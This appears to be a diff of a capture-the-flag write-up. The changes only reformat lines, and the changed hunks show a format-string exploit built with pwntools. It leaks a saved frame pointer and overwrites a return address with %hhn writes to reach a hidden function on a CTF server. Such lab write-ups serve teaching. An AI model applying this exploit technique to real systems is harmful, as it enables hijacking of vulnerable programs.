@@ -63,7 +63,7 @@ title: "for matt"
 │       │   0x080488bf      8d85eefbffff   lea eax, [ebp - local_412h]
 │       │   0x080488c5      890424         mov dword [esp], eax
 │       │   0x080488c8      e853fdffff     call sym.imp.strlen
-│       │   ; [0x8049fe8:4]=0x48206465 LEA obj.comm_fd ; "ed Hat 4.8.3-9)" @ 0x8049fe8
+│       │   ; LEA obj.comm_fd ; "ed Hat 4.8.3-9)" @ 0x8049fe8
 │       │   0x080488cd      8b15e89f0408   mov edx, dword [obj.comm_fd]
 │       │   0x080488d3      c744240c0000.  mov dword [esp + local_ch], 0
 │       │   0x080488db      89442408       mov dword [esp + local_8h], eax
@@ -186,7 +186,8 @@ gef➤
  Thus we calculated the format string in python
 
 ```
-p32(raplus1) + p32(return_addr) + "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 143 + 8) + "%135$hhn"
+p32(raplus1) + p32(return_addr)\
++ "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 143 + 8) + "%135$hhn"
 ```
 
  Where the 143 + 8 is needed to offset the bytes written for one byte prior to writing the other byte.
@@ -196,7 +197,7 @@ p32(raplus1) + p32(return_addr) + "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 14
 [+] Opening connection to eric.32774074faceba7c.ctf.land on port 6600: Done
 [*] found RA @ ffd0534c
 [*] Switching to interactive mode
-RECV:MSLSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ SpacesInsteadOfTabs?!
+RECV:MSLSA ..<alot of A>.. A$ SpacesInsteadOfTabs?!
 ```
 ## full exploit:
 
@@ -212,7 +213,8 @@ from pwn import *
 
 # read out & save saved ebp
 # calculate address of RA
-# write this address at the beginning of the string and write with secret functions addr 
+# write this address at the beginning of
+# the string and write with secret functions addr 
 
 r = remote('eric.32774074faceba7c.ctf.land', 6600)
 r.send("%265$08x")
@@ -224,7 +226,11 @@ raplus1 = u32(saved_ebp) - 0x60 + 4 + 1
 
 log.info("found RA @ {:x}".format(return_addr))
 
-r.send(p32(raplus1) + p32(return_addr) + "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 143 + 8) + "%135$hhn") # first one is 0x87, second one is 0xb0
+r.send(p32(raplus1) + p32(return_addr) \
+        + "A" * (135 - 8) + "%134$hhn" \
+        + "A" * (176 - 143 + 8) \
+        + "%135$hhn")
+        # first one is 0x87, second one is 0xb0
 
 r.interactive()
 
